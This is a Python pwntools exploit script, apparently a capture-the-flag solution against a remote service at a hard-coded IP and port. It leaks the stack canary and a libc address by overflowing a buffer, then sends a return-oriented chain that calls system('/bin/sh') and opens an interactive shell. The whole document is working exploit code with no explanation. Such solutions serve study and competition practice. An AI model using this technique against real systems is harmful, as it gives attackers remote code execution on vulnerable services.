from pwn import *

#io = process('./a')
io = remote('45.153.243.57', 1337)
libc = ELF('./libc.so.6')

sla = io.sendlineafter
sa = io.sendafter

pl = b'a'*0x49

sla(b'???\n', b'200')
sa(b'content\n', pl)

io.recv(0x49)
canary = u64(b'\0'+io.recv(7))
log.info('canary: '+hex(canary))

sla(b'again?\n', b'1337')

sla(b'???\n', b'200')
pl = b'a'*0x58

sa(b'content\n', pl)

io.recv(0x58)
libc.address = u64(io.recv(6)+b'\0\0') - 0x29d90

pl = b'a'*0x48+p64(canary)+p64(0)+p64(libc.address+0x000000000002a3e5+1)+p64(libc.address+0x000000000002a3e5)+p64(next(libc.search(b'/bin/sh')))+p64(libc.sym['system'])

sla(b'again?\n', b'1337')

sla(b'???\n', b'200')
sa(b'content\n', pl)

#gdb.attach(io)

sla(b'again?\n', b'1')

io.interactive()